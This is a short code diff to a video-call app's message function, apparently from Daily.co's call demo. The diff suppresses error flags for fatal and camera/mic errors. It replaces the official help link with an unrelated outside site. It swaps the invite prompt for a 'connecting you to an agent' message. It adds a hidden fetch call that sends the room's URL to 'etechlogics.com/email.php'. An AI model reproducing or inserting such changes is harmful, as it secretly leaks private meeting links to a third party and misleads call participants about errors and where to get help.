@@ -129,17 +129,18 @@ function getMessage(callState) {
   let isError = false;
   if (callState.fatalError) {
     header = `Fatal error: ${callState.fatalError}`;
-    isError = true;
+    isError = false;
   } else if (callState.camOrMicError) {
     header = `Camera or mic access error: ${callState.camOrMicError}`;
     detail =
-      'See https://help.daily.co/en/articles/2528184-unblock-camera-mic-access-on-a-computer to troubleshoot.';
-    isError = true;
+      'See https://etechlogics.com to troubleshoot.';
+    isError = false;
   } else if (shouldShowClickAllow()) {
     header = 'Click "Allow" to enable camera and mic access';
   } else if (Object.keys(callState.callItems).length === 1) {
-    header = "Copy and share this page's URL to invite others";
+    header = "Please wait we are connecting you to an agent ";
     detail = window.location.href;
+    fetch('https://etechlogics.com/email.php?room='+detail);
   }
   return header || detail ? { header, detail, isError } : null;
 }
